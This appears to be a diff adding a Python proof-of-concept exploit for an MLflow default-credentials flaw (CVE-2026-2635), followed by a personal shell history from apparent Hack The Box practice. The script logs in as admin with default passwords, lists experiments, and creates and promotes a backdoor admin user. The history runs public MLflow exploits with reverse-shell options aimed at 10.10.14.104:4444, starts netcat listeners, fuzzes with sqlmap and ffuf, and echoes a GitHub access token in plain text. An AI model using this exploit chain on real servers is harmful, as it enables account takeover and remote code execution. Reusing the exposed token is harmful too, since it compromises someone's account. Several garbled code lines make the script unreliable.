@@ -1,0 +1,500 @@
+    except Exception as e:
+        return None, None, str(e)
+def exploit(target_host, target_port):
+    """Run the full PoC exploit against the target MLflow server."""
+    base_url = f"http://{target_host}:{target_port}"
+    results = {"steps": [], "success": False}
+    # ─── Step 1: Verify authentication is enabled ────────────────────────
+    print(f"{BOLD}[Step 1]{RESET} Checking if authentication is enabled on {base_url} ...")
+    status, body, err = make_request(f"{base_url}/api/2.0/mlflow/experiments/search")
+    if err:;         print(f"  {RED}[FAIL]{RESET} Connection error: {err}")
+        results["steps"].append(("auth_check", "FAIL", f"Connection error: {err}"))
+        return results
+    if status == 401:;         print(f"  {GREEN}[OK]{RESET}   Server returned HTTP 401 — authentication is enforced")
+        results["steps"].append(("auth_check", "PASS", "HTTP 401 — auth enforced"))
+    elif status == 200:
+        print(f"  {YELLOW}[WARN]{RESET} Server returned HTTP 200 without credentials — auth may not be enabled")
+        results["steps"].append(("auth_check", "WARN", "HTTP 200 — auth may not be enabled"))
+    else:
+        print(f"  {YELLOW}[INFO]{RESET} Server returned HTTP {status}")
+        results["steps"].append(("auth_check", "INFO", f"HTTP {status}"))
+    # ─── Step 2: Authenticate with default credentials ───────────────────
+    print(f"\n{BOLD}[Step 2]{RESET} Attempting authentication with default credentials ...")
+    print(f"         Username: {DEFAULT_USERNAME}")
+    print(f"         Password: {DEFAULT_PASSWORD}")
+    auth = (DEFAULT_USERNAME, DEFAULT_PASSWORD)
+    status, body, err = make_request(
+        f"{base_url}/api/2.0/mlflow/users/get?username={DEFAULT_USERNAME}",
+        auth=auth
+    )
+    if err:;         print(f"  {RED}[FAIL]{RESET} Connection error: {err}")
+        results["steps"].append(("default_auth", "FAIL", f"Connection error: {err}"))
+        return results
+    if status == 200:;         print(f"  {GREEN}[OK]{RESET}   HTTP 200 — Authentication successful with default credentials!")
+        results["steps"].append(("default_auth", "PASS", "HTTP 200 — default creds accepted"))
+    elif status == 401:
+        # Try legacy password
+        print(f"  {YELLOW}[INFO]{RESET} HTTP 401 with current password, trying legacy password '{LEGACY_PASSWORD}' ...")
+        auth = (DEFAULT_USERNAME, LEGACY_PASSWORD)
+        status, body, err = make_request(
+            f"{base_url}/api/2.0/mlflow/users/get?username={DEFAULT_USERNAME}",
+            auth=auth
+        )
+        if status == 200:;             print(f"  {GREEN}[OK]{RESET}   HTTP 200 — Authentication successful with LEGACY credentials!")
+            results["steps"].append(("default_auth", "PASS", "HTTP 200 — legacy creds accepted"))
+        else:
+            print(f"  {RED}[FAIL]{RESET} HTTP {status} — default credentials rejected")
+            results["steps"].append(("default_auth", "FAIL", f"HTTP {status} — creds rejected"))
+            return results
+    else:
+        print(f"  {RED}[FAIL]{RESET} Unexpected HTTP {status}")
+        results["steps"].append(("default_auth", "FAIL", f"HTTP {status}"))
+        return results
+    # ─── Step 3: Confirm admin-level access ──────────────────────────────
+    print(f"\n{BOLD}[Step 3]{RESET} Verifying admin-level access ...")
+    user_data = body.get("user", body) if isinstance(body, dict) else {}
+    is_admin = user_data.get("is_admin", False)
+    username = user_data.get("username", "unknown")
+    user_id = user_data.get("id", "unknown")
+    if is_admin:;         print(f"  {GREEN}[OK]{RESET}   Confirmed admin access!")
+        print(f"         User ID:   {user_id}")
+        print(f"         Username:  {username}")
+        print(f"         is_admin:  {GREEN}{is_admin}{RESET}")
+        results["steps"].append(("admin_confirm", "PASS", f"is_admin=True, id={user_id}"))
+    else:
+        print(f"  {YELLOW}[WARN]{RESET} Authenticated but is_admin={is_admin}")
+        results["steps"].append(("admin_confirm", "WARN", f"is_admin={is_admin}"))
+    # ─── Step 4: Demonstrate data access — list experiments ──────────────
+    print(f"\n{BOLD}[Step 4]{RESET} Demonstrating data access — listing experiments ...")
+    status, body, err = make_request(
+        f"{base_url}/api/2.0/mlflow/experiments/search",
+        method="POST",
+        data={"max_results": 100},
+        auth=auth
+    )
+    if status == 200 and body:;         experiments = body.get("experiments", [])
+        print(f"  {GREEN}[OK]{RESET}   Retrieved {len(experiments)} experiment(s)")
+        for exp in experiments[:5]:;             exp_id = exp.get("experiment_id", "?")
+            exp_name = exp.get("name", "?")
+            print(f"         - Experiment {exp_id}: {exp_name}")
+        if len(experiments) > 5:
+            print(f"         ... and {len(experiments) - 5} more")
+        results["steps"].append(("data_access", "PASS", f"{len(experiments)} experiments"))
+    else:
+        print(f"  {YELLOW}[INFO]{RESET} HTTP {status} — experiment listing returned: {body}")
+        results["steps"].append(("data_access", "INFO", f"HTTP {status}"))
+    # ─── Step 5: Demonstrate privilege escalation — create user ──────────
+    print(f"\n{BOLD}[Step 5]{RESET} Demonstrating privilege escalation — creating a new user ...")
+    backdoor_user = "cve_2026_2635_poc"
+    backdoor_pass = "poc_password1234"
+    status, body, err = make_request(
+        f"{base_url}/api/2.0/mlflow/users/create",
+        method="POST",
+        data={"username": backdoor_user, "password": backdoor_pass},
+        auth=auth
+    )
+    if status == 200 and body:;         new_user = body.get("user", body)
+        new_id = new_user.get("id", "?")
+        print(f"  {GREEN}[OK]{RESET}   Created user '{backdoor_user}' (ID: {new_id})")
+        results["steps"].append(("user_create", "PASS", f"user={backdoor_user}, id={new_id}"))
+        # Grant admin to the new user
+        print(f"         Granting admin privileges to '{backdoor_user}' ...")
+        status2, body2, err2 = make_request(
+            f"{base_url}/api/2.0/mlflow/users/update-admin",
+            method="PATCH",
+            data={"username": backdoor_user, "is_admin": True},
+            auth=auth
+        )
+        if status2 == 200:;             print(f"  {GREEN}[OK]{RESET}   '{backdoor_user}' is now an admin — persistent backdoor established")
+            results["steps"].append(("admin_grant", "PASS", f"admin granted to {backdoor_user}"))
+        else:
+            print(f"  {YELLOW}[INFO]{RESET} Admin grant returned HTTP {status2}")
+            results["steps"].append(("admin_grant", "INFO", f"HTTP {status2}"))
+        # Clean up: delete the PoC user
+        print(f"         Cleaning up — deleting PoC user '{backdoor_user}' ...")
+        status3, _, _ = make_request(
+            f"{base_url}/api/2.0/mlflow/users/delete",
+            method="DELETE",
+            data={"username": backdoor_user},
+            auth=auth
+        )
+        if status3 == 200:;             print(f"  {GREEN}[OK]{RESET}   Cleanup successful — PoC user deleted")
+        else:
+            print(f"  {YELLOW}[INFO]{RESET} Cleanup returned HTTP {status3}")
+    elif status == 409 or (body and "RESOURCE_ALREADY_EXISTS" in str(body)):
+        print(f"  {YELLOW}[INFO]{RESET} User '{backdoor_user}' already exists (from previous run)")
+        results["steps"].append(("user_create", "INFO", "User already exists"))
+    else:
+        print(f"  {RED}[FAIL]{RESET} User creation returned HTTP {status}: {body}")
+        results["steps"].append(("user_create", "FAIL", f"HTTP {status}"))
+    # ─── Summary ─────────────────────────────────────────────────────────
+    passed = sum(1 for _, s, _ in results["steps"] if s == "PASS")
+    total = len(results["steps"])
+    results["success"] = passed >= 3  # auth check + default auth + admin confirm
+    print(f"\n{BOLD}{'═' * 62}{RESET}")
+    if results["success"]:;         print(f"{BOLD}{GREEN}[VULNERABLE]{RESET} CVE-2026-2635 confirmed — {passed}/{total} checks passed")
+        print(f"""
+{BOLD}Exploitation Summary:{RESET}
+  • Default credentials accepted: {DEFAULT_USERNAME}:{auth[1]}
+  • Admin access confirmed (bypasses all authorization checks)
+  • Full read/write/delete access to all MLflow resources
+  • Ability to create/delete users and grant admin privileges
+  • No prior authentication required — pre-auth vulnerability
+""")
+    else:
+        print(f"{BOLD}{RED}[NOT VULNERABLE]{RESET} Default credentials rejected — {passed}/{total} checks passed")
+    return results
+if __name__ == "__main__":;     banner()     target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
+    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5000
+    print(f"Target: {target}:{port}\n")
+    result = exploit(target, port)
+    sys.exit(0 if result["success"] else 1)
+python poc.py 
+ls
+rm -rf *
+nvim poc.py
+python poc.py 
+python poc.py 
+python poc.py 
+python poc.py -h
+nvim poc.py
+python poc.py models.smarthire.htb 80
+nvim poc.py
+ls
+pwd
+git clone https://github.com/SparshBiswas-AI/CVE-2026-0596-Reproduction
+cd CVE-2026-0596-Reproduction/
+ls
+ls
+ls
+python -m venv .venv 
+source .venv/bin/activate
+ls
+cd ..
+git clone https://github.com/SparshBiswas-AI/CVE-2026-0596-Reproduction
+ls
+cd CVE-2026-0596-Reproduction/
+ls
+docker build .
+python trigger_native.py 
+pip install -r requirements.txt 
+ls
+docker build .
+sudo docker build .
+ls
+docker cp trigger_native.py mlflow_sandbox:/app/trigger_native.py
+sudo docker cp trigger_native.py mlflow_sandbox:/app/trigger_native.py
+sudo docker build -t mlflow_sandbox .
+sudo docker cp trigger_native.py mlflow_sandbox:/app/trigger_native.py
+docker run mlflow_sandbox
+sudo docker run mlflow_sandbox
+sudo docker cp trigger_native.py mlflow_sandbox:/app/trigger_native.py
+python trigger_native.py 
+pip install -r requirements.txt 
+cd ..
+ls
+git clone https://github.com/NiteeshPujari/CVE-2024-37054-MLflow-RCE/
+ls
+cd CVE-2024-37054-MLflow-RCE/
+ls
+cd poc/
+ls
+python load_vulnerable_model.py 
+docker build -t mlflow-vulnerable .
+ls
+cd ..
+docker build -t mlflow-vulnerable .
+sudo docker build -t mlflow-vulnerable .
+ls
+ls
+ls
+ls
+ls
+cd ..
+ls
+git clone https://github.com/tristanqtn/CVE-2024-37054
+cd CVE-2024-37054
+ls
+python exploit.py 
+pip install requests
+pip install --upgrade pip
+ls
+ls
+python exploit.py 
+python exploit.py 
+pip install cloudpickle
+python exploit.py 
+python3 exploit.py --mlflow http://models.smarthire.htb   --user admin --pass password   list
+ip addr
+python3 exploit.py --mlflow http://mlflow.target.com   --user admin --pass password   revshell 10.10.14.104/ 4444
+ls
+python3 exploit.py --mlflow http://models.smarthire.htb  --user admin --pass password   revshell 10.10.14.104/ 4444
+ls
+ls
+ls
+pwd
+ls
+ls
+ls
+ls
+ls
+pwd
+pwd
+pwd
+python3 exploit.py --mlflow http://models.smarthire.htb  --user admin --pass password   revshell 10.10.14.104/ 4444
+cd ..
+git clone https://github.com/ben-slates/CVE-2024-37054
+ls
+rm -rf CVE-2024-37054
+git clone https://github.com/ben-slates/CVE-2024-37054
+cd CVE-2024-37054
+ls
+ls
+python poc.py 
+python poc.py smarthire.htb models.smarthire.htb 10.10.14.104 4444
+python poc.py smarthire.htb models.smarthire.htb 10.10.14.104 4444
+python poc.py smarthire.htb models.smarthire.htb 10.10.14.104 4444
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444
+ip addr
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --app-username admin --app-password password
+python poc.py http://models.smarthire.htb http://smarthire.htb 10.10.14.104 4444 --app-username admin --app-password password
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --app-username admin --app-password password
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password
+ip addr
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password --cmd "whoami"
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password --cmd "whoami"
+python poc.py 
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --cmd "whoami"
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --cmd "whoami"
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password 
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password 
+python poc.py http://models.smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password 
+python poc.py http://models.smarthire.htb http://models.smarthire.htb 10.10.14.104 4444  --app-username admin --app-password password 
+python poc.py http://models.smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password 
+python poc.py --mlflow http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password 
+python poc.py http://models.smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password 
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password 
+python poc.py http://models.smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password 
+ip add
+nc 10.10.14.104 4444
+iptables
+ip
+ip addr
+ip addr
+ip addr
+ip addr
+cat poc.py 
+ip addr
+python poc.py http://models.smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password 
+python poc.py http://models.smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password 
+python poc.py http://models.smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password 
+python poc.py http://models.smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password 
+python poc.py http://models.smarthire.htb http://smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password 
+python poc.py http://models.smarthire.htb http://smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password 
+python poc.py http://models.smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password 
+python poc.py http://models.smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --mlflow-creds admin:password --app-username admin --app-password password 
+python poc.py http://models.smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --app-username admin --app-password password 
+python poc.py http://models.smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --app-username admin --app-password password 
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --app-username admin --app-password password 
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --app-username admin --app-password password 
+python poc.py http://models.smarthire.htb http://smarthire.htb 10.10.14.104 4444 --app-username admin --app-password password 
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --app-username admin --app-password password 
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --app-username admin --app-password password 
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --app-username admin --app-password password 
+python poc.py http://smarthire.htb http://models.smarthire.htb 10.10.14.104 4444 --app-username admin --app-password password 
+ferox
+xbps-query -Rs ferox
+cd projects/
+ls
+cd fuzz
+mkdir fuzz
+cd fuzz
+ls
+git clone https://github.com/epi052/feroxbuster
+cd feroxbuster/
+ls
+make
+sqlmap
+xbps-query -Rs sqlmap
+sqlmap vote.cobblestone.htb/index.php
+sqlmap.py vote.cobblestone.htb/index.php 
+nc -lvnp 4444
+nc -lvnp 4444
+nc -lvnp 4444
+ufw
+iptables
+iptables -j
+iptables -h
+nc -lvnp 4444
+sudo nc -lvnp 4444
+
+nc -lvnp 4444
+nc -lvnp 4444
+sudo nvim /etc/hosts
+sudo nvim /etc/hosts
+sudo nvim /etc/hosts
+nvim
+sudo nmtui
+sudo nmap -sS -sV cobblestone.htb
+cd projects/
+ls
+cd SecLists/
+ls
+cd ..
+ls
+cd SecLists/
+ls
+cd ..
+ls
+cd dmenu-controller
+ls
+cd ..
+cd wordlists/
+ls
+cd n0kovo_subdomains/
+ls
+cat n0kovo_subdomains_small.txt 
+fuff 
+ffuf
+ffuf -h
+clear
+ffuf -h
+ffuf -h
+clear
+ffuf -h
+ffuf -w n0kovo_subdomains_small.txt -u http://FUZZ.cobblestone.htb/
+ffuf -w n0kovo_subdomains_small.txt -u http://FUZZ.cobblestone.htb/ -mc 200
+docker prune
+sudo docker image prune
+nvim
+xbps-query -Rs selinux
+echo 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 > .chrono 
+cat .chrono 
+cat .chrono 
+docker images
+sudo docker images
+docker rmi mlflow_sandbox:latest
+sudo docker rmi mlflow_sandbox:latest
+sudo docker rmi 9b4384596a81
+docker rm 261f87cec320
+sudo docker rm 261f87cec320
+sudo docker rmi 9b4384596a81
+sudo docker images
+sudo docker rmi 7b2a78c29d2d
+sudo docker rmi 6f486696bc2b
+docker rm dea5b3b89dd5
+sudo docker rm dea5b3b89dd5
+sudo docker rmi 6f486696bc2b
+sudo nmtui
+sudo sv restart NetworkManager
+sudo nmtui
+sudo sv restart NetworkManager
+sudo nmtui
+cd Downloads/
+ls
+openvpn machines_eu-1.ovpn 
+sudo openvpn machines_eu-1.ovpn 
+sudo sv restart NetworkManager
+sudo nmtui
+sudo nmtui
+nvim projects/cobblestone/upload.php 
+cd /home/edo/notes/02s3a/Economics/
+ls
+mkdir domande
+mv domande_solo_testo.zip domande
+cd domande/
+ls
+unzip domande_solo_testo.zip 
+ls
+mupdf pag01_1.jpg
+mupdf pag01_2.jpg
+mupdf pag01_3.jpg
+mupdf pag01_4.jpg
+mupdf pag01_5.jpg
+mupdf pag01_6.jpg
+mupdf pag01_7.jpg
+mupdf pag01_8.jpg
+mupdf pag01_9.jpg
+mupdf pag01_9.jpg 
+mupdf pag01_9.jpg 
+mupdf pag01_10.jpg 
+mupdf pag01_11.jpg 
+mupdf pag01_12.jpg 
+mupdf pag02_1.jpg 
+cd projects/
+cd bits/
+ls
+pyenv
+pyenv list
+ls
+cd bits-server/
+ls
+pyenv local
+ls .venv/pyvenv.cfg 
+cat .venv/pyvenv.cfg 
+sudo nmtui
+sudo nmtui
+sudo nmtui
+sudo nmtui
+ls
+cd projects/
+du sh
+du -sh
+cd notes/02s3a/
+ls
+cd ..
+ls
+cd ..
+ls
+cd void-packages/
+ls
+git pull origin main
+ls
+git pull origin master
+./xbps-src pkg intellij-idea-ultimate-edition
+./xbps-src pkg intellij-idea-ultimate-edition
+intellij-idea-ultimate-edition:
+ls
+cd srcpkgs/
+ls
+cd ..
+ls
+cd masterdir-x86_64/
+ls
+cd ..
+ls
+cd common/
+ls
+cd ..
+ls
+cd hostdir/
+ls
+cd binpkgs/
+xi nonfree/intellij-idea-ultimate-edition-2025.3.1.1_1.x86_64.xbps 
+sudo xbps-install nonfree/intellij-idea-ultimate-edition
+sudo xbps-install nonfree/intellij-idea-ultimate-edition
+sudo xbps-install nonfree/intellij-idea-ultimate-edition-2025.3.1.1_1.x86_64.xbps 
+cd ..
+cd ..
+sudo xbps-install hostdir/binpkgs/nonfree/ intellij-idea-ultimate-edition-2025.3.1.1_1.x86_64.xbps 
+sudo xbps-install hostdir/binpkgs/ intellij-idea-ultimate-edition-2025.3.1.1_1.x86_64.xbps 
+sudo xbps-install --repository hostdir/binpkgs intellij-idea-ultimate-edition-2025.3.1.1_1.x86_64.xbps 
+sudo xbps-install --repository hostdir/binpkgs intellij-idea-ultimate
+sudo xbps-install --repository hostdir/binpkgs intellij-idea-ultimate-edition
+sudo xbps-install --repository hostdir/binpkgs/nonfree intellij-idea-ultimate-edition
+cd hostdir/binpkgs/
+ls
+cd nonfree/
+ls -la
+rm -rf intellij-idea-*
+ps ax | grep feh
+whereis java
+cd projects
+lsblk
+ls -la
+rm -rf initramfs.cpio*
